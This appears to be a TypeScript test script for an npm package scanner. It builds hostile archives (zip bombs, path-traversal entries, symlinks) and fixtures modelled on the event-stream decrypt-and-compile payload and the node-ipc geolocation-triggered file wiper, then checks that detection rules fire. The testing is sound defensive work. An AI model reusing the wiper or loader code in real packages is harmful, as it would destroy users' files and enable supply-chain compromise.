// Offline checks for the tarball-diff tier (#39):  npm run verify-diff
//
// Part 1 feeds hostile and broken archives to the reader and checks each is
// skipped safely with a reason. Part 2 runs the static rules on FIXTURES that
// mimic two famous attacks. The real event-stream@3.3.6 and node-ipc@10.1.x
// tarballs were removed from npm (they 404), so these are small rebuilds of
// the code patterns described in public write-ups, not the original files.
// Exits 1 if any check fails.
import { gzipSync } from 'node:zlib';
import { unpackTarball, fetchTarball, TARBALL_LIMITS, type Tarball } from '../src/lib/packages/tarball';
import { scanDiff } from '../src/lib/packages/diff';

// ── a tiny tar writer, so hostile archives can be made on purpose ────────

interface Entry { name: string; content?: string; type?: string; }

function header(name: string, size: number, type: string): Buffer {
  const b = Buffer.alloc(512);
  b.write(name, 0, 100);
  b.write('0000644\0', 100);
  b.write('0000000\0', 108);
  b.write('0000000\0', 116);
  b.write(`${size.toString(8).padStart(11, '0')}\0`, 124);
  b.write('00000000000\0', 136);
  b.fill(0x20, 148, 156);
  b.write(type, 156);
  b.write('ustar\0', 257);
  b.write('00', 263);
  let sum = 0;
  for (const byte of b) sum += byte;
  b.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
  return b;
}

function makeTar(entries: Entry[]): Buffer {
  const parts: Buffer[] = [];
  for (const { name, content = '', type = '0' } of entries) {
    const data = Buffer.from(content);
    parts.push(header(name, data.length, type), data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}

const tgz = (entries: Entry[]) => gzipSync(makeTar(entries));
const pkg = (files: Record<string, string>): Entry[] =>
  Object.entries(files).map(([name, content]) => ({ name: `package/${name}`, content }));

let failures = 0;
function check(label: string, ok: boolean, extra = '') {
  if (!ok) failures++;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}${extra ? `  (${extra})` : ''}`);
}

// ── part 1: reader safety ────────────────────────────────────────────────

console.log('— archive safety');

const good = await unpackTarball(tgz(pkg({ 'package.json': '{"name":"x"}', 'lib/a.js': 'module.exports = 1;' })));
check('normal archive is read, "package/" prefix stripped', good.ok && good.tarball.files.has('lib/a.js') && good.tarball.files.get('package.json')?.text === '{"name":"x"}');

const bomb = await unpackTarball(gzipSync(Buffer.alloc(TARBALL_LIMITS.maxUnpackedBytes * 3)));
check('zip bomb is skipped, not unpacked', !bomb.ok && bomb.kind === 'skipped' && /zip bomb/.test(bomb.reason), bomb.ok ? '' : bomb.reason);

const notGzip = await unpackTarball(Buffer.from('this is not a tarball'));
check('non-gzip input is skipped', !notGzip.ok && notGzip.kind === 'skipped', notGzip.ok ? '' : notGzip.reason);

const truncated = await unpackTarball(tgz(pkg({ 'a.js': 'x'.repeat(5000) })).subarray(0, 40));
check('truncated gzip is skipped', !truncated.ok && truncated.kind === 'skipped', truncated.ok ? '' : truncated.reason);

const garbageTar = await unpackTarball(gzipSync(Buffer.alloc(2048, 0x41)));
check('valid gzip holding garbage (bad tar checksum) is skipped', !garbageTar.ok && /checksum/.test(garbageTar.reason), garbageTar.ok ? '' : garbageTar.reason);

const overrun = makeTar(pkg({ 'a.js': 'hello' }));
overrun.write('77777777777\0', 124); // header now claims a huge size (checksum fixed below)
let sum = 0;
overrun.fill(0x20, 148, 156);
for (let i = 0; i < 512; i++) sum += overrun[i];
overrun.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148);
const overrunResult = await unpackTarball(gzipSync(overrun));
check('entry claiming more data than exists is skipped', !overrunResult.ok && /past the end/.test(overrunResult.reason), overrunResult.ok ? '' : overrunResult.reason);

const hostile = await unpackTarball(tgz([
  { name: 'package/ok.js', content: '1' },
  { name: '../../etc/evil.js', content: 'x' },
  { name: '/abs/evil.js', content: 'x' },
  { name: 'package/../../up.js', content: 'x' },
  { name: 'package/link', type: '2' },
]));
check('path traversal, absolute paths dropped and counted; symlink ignored',
  hostile.ok && hostile.tarball.unsafeEntries === 3 && [...hostile.tarball.files.keys()].join() === 'ok.js',
  hostile.ok ? `unsafe=${hostile.tarball.unsafeEntries} files=${[...hostile.tarball.files.keys()]}` : hostile.reason);

const many = await unpackTarball(tgz(Array.from({ length: TARBALL_LIMITS.maxFiles + 1 }, (_, i) => ({ name: `package/f${i}.txt`, content: 'x' }))));
check('too many files is skipped', !many.ok && /files/.test(many.reason), many.ok ? '' : many.reason);

const bigDeclared = await fetchTarball('https://registry.npmjs.org/x/-/x-1.0.0.tgz', TARBALL_LIMITS.maxUnpackedBytes + 1);
check('registry-declared huge package is skipped before any download', !bigDeclared.ok && bigDeclared.kind === 'skipped', bigDeclared.ok ? '' : bigDeclared.reason);

const foreign = await fetchTarball('https://evil.example.com/x.tgz');
check('tarball URL outside the npm registry is refused', !foreign.ok && foreign.kind === 'failed', foreign.ok ? '' : foreign.reason);

// ── part 2: detection on attack-shaped fixtures ──────────────────────────

console.log('\n— detection (fixtures modelled on public write-ups)');

async function tarball(files: Record<string, string>): Promise<Tarball> {
  const r = await unpackTarball(tgz(pkg(files)));
  if (!r.ok) throw new Error(r.reason);
  return r.tarball;
}
const ruleIds = (signals: ReturnType<typeof scanDiff>) => signals.filter((s) => s.type === 'diff_rule').map((s) => s.rule);

// event-stream 3.3.6 pulled in flatmap-stream, whose bundle decrypted a payload
// with a key taken from the host package's description and compiled it as a module.
const hex = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'.repeat(16);
const eventStreamNext = await tarball({
  'package.json': '{"name":"flatmap-stream","version":"0.1.1"}',
  'index.min.js':
    `!function(){try{var r=require,t=process;var n=r("crypto"),o=t.env.npm_package_description;` +
    `var u=n.createDecipher("aes256",o),a=u.update("${hex}","hex","utf8");a+=u.final("utf8");` +
    `var f=new module.constructor;f.paths=module.paths,f._compile(a,"x"),f.exports(1)}catch(e){}}();`,
});
const es = scanDiff(null, eventStreamNext, 'flatmap-stream@0.1.1');
check('event-stream-style payload: decrypt-then-exec and compile-from-string fire',
  ruleIds(es).includes('decrypt_then_exec') && ruleIds(es).includes('compile_from_string'), `rules=${ruleIds(es)}`);
check('event-stream-style payload: long encoded blob fires', ruleIds(es).includes('encoded_blob'));

// node-ipc 10.1.1: ask an IP-geolocation API where the machine is, then overwrite files
// when the country matches.
const ipcPrev = await tarball({ 'package.json': '{"name":"node-ipc","version":"9.2.1"}', 'index.js': 'module.exports = require("./lib");' });
const ipcNext = await tarball({
  'package.json': '{"name":"node-ipc","version":"10.1.1"}',
  'index.js': 'module.exports = require("./lib");',
  'ssl-geospec.js':
    `const fs = require('fs'); const https = require('https');\n` +
    `function wipe(dir) { fs.readdirSync(dir).forEach((f) => fs.writeFile(dir + '/' + f, 'x', () => {})); }\n` +
    `https.get('https://api.ipgeolocation.io/ipgeo?apiKey=k', (res) => {\n` +
    `  res.on('data', (d) => { const c = JSON.parse(d).country_name; if (c.includes('Russia') || c.includes('Belarus')) wipe('/'); });\n` +
    `});`,
});
const ipc = scanDiff(ipcPrev, ipcNext, 'node-ipc@10.1.1');
check('node-ipc-style: geolocation lookup fires', ruleIds(ipc).includes('geo_lookup'), `rules=${ruleIds(ipc)}`);
check('node-ipc-style: location-guarded file overwrite fires as critical',
  ipc.some((s) => s.rule === 'geo_guarded_destruction' && s.severity === 'critical'));
check('node-ipc-style: new code file is reported', ipc.some((s) => s.type === 'diff_new_files'));

// A rewritten install hook is reported; an ordinary refactor is not
const hookPrev = await tarball({ 'package.json': '{"scripts":{"postinstall":"node setup.js"}}', 'setup.js': 'console.log("setup");' });
const hookNext = await tarball({ 'package.json': '{"scripts":{"postinstall":"node -e \\"require(\'./x\')\\""}}', 'setup.js': 'console.log("setup");' });
check('rewritten postinstall command is reported', scanDiff(hookPrev, hookNext, 'p@2').some((s) => s.type === 'diff_install_script'));

const benignPrev = await tarball({ 'package.json': '{"name":"ok"}', 'lib.js': 'exports.add = (a, b) => a + b;' });
const benignNext = await tarball({ 'package.json': '{"name":"ok"}', 'lib.js': 'exports.add = (a, b) => a + b;\nexports.sub = (a, b) => a - b;\n// see https://github.com/example/ok' });
check('ordinary refactor produces no signals', scanDiff(benignPrev, benignNext, 'ok@1.1.0').length === 0);

const unchanged = scanDiff(ipcNext, ipcNext, 'node-ipc@10.1.1');
check('identical versions produce no signals', unchanged.length === 0);

const traversal = await unpackTarball(tgz([{ name: 'package/a.js', content: '1' }, { name: '../evil.js', content: 'x' }]));
check('unsafe archive paths are reported as a signal', traversal.ok && scanDiff(null, traversal.tarball, 'x@1').some((s) => s.type === 'archive_anomaly'));

console.log(failures === 0 ? '\nAll checks passed.' : `\n${failures} check(s) failed.`);
process.exit(failures === 0 ? 0 : 1);
